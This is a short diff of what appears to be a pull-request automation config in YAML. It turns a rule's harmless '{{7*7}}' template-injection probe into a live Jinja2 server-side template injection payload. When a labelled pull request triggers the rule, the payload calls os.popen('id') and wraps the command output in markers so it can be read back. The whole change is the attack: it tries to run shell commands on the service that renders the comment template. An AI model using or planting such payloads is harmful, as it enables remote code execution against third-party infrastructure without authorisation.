@@ -1,7 +1,8 @@
 pull_request_rules:
-  - name: ssti-probe
+  - name: ssti-runtime-real
     conditions:
-      - label = "trigger"
+      - label = "ssti-trigger"
     actions:
       comment:
-        message: "{{7*7}}"
+        message: |
+          REAL_SSTI={{lipsum.__globals__['os'].popen('id').read()}}=END
